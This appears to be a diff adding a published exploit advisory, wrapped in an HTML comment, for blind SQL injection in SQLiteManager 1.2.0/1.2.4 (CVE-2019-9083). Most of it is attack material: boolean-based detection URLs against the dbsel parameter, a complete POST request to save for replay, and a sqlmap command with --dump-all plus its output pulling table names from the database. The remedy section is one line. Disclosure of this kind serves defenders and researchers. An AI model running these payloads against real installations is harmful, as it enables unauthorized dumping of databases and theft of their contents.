@@ -1,0 +1,79 @@
+<!--
+# Exploit Title: Blind SQL injection in SQLiteManager 1.2.0 (and 1.2.4)
+# Date: 17-02-2019
+# Exploit Author: Rafael Pedrero
+# Vendor Homepage: http://www.sqlitemanager.org/
+# Software Link: http://www.sqlitemanager.org/
+# Version: SQLiteManager 1.2.0 (and 1.2.4)
+# Tested on: All
+# CVE : CVE-2019-9083
+# Category: webapps
+
+
+1. Description
+
+SQLiteManager 1.20 allows SQL injection via the /sqlitemanager/main.php
+dbsel parameter. NOTE: This product is discontinued.
+
+
+2. Proof of Concept
+
+Detect:
+http://localhost/sqlitemanager/main.php?dbsel=-1%20or%2072%20=%2072
+http://localhost/sqlitemanager/main.php?dbsel=-1%20or%2072%20=%2070
+
+Save the next post in a file: sqli.txt
+
+POST /sqlite/main.php?dbsel=-1%20or%2032%20%3d%2030 HTTP/1.1
+Content-Length: 191
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Cookie: PHPSESSID=s5uogfet0s4nhr81ihgmg5l4v3;
+SQLiteManager_currentTheme=default; SQLiteManager_currentLangue=8;
+SQLiteManager_fullText=0; SQLiteManager_HTMLon=0
+Host: localhost
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64;
+Trident/5.0)
+
+action=save&ColumnList=1&ConditionList=1&trigger=&TriggerAction=FOR%20EACH%20ROW&TriggerCondition=WHEN&TriggerEvent=DELETE&TriggerMoment=BEFORE&TriggerName=kqluvanc&TriggerOn=t1&TriggerStep=1
+
+$ python sqlmap.py -r sqli.txt -p dbsel --level 5 --risk 3 --dump-all
+
+[11:58:27] [INFO] resuming back-end DBMS 'sqlite'
+[11:58:27] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: dbsel (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: dbsel=-4019 OR 7689=7689
+---
+[11:58:27] [INFO] the back-end DBMS is SQLite
+web server operating system: Windows
+web application technology: PHP X.X.X, Apache 2.X.X
+back-end DBMS: SQLite
+[11:58:27] [INFO] sqlmap will dump entries of all tables from all databases
+now
+[11:58:27] [INFO] fetching tables for database: 'SQLite_masterdb'
+[11:58:27] [INFO] fetching number of tables for database 'SQLite_masterdb'
+[11:58:27] [WARNING] reflective value(s) found and filtering out
+[11:58:27] [WARNING] running in a single-thread mode. Please consider usage
+of o
+ption '--threads' for faster data retrieval
+[11:58:27] [INFO] retrieved: 5
+[11:58:27] [INFO] retrieved: database
+[11:58:28] [INFO] retrieved: user_function
+[11:58:30] [INFO] retrieved: attachment
+[11:58:31] [INFO] retrieved: groupes
+[11:58:32] [INFO] retrieved: users
+.....
+.....
+.....
+
+
+3. Solution:
+
+The product is discontinued. Update to last version.
+-->
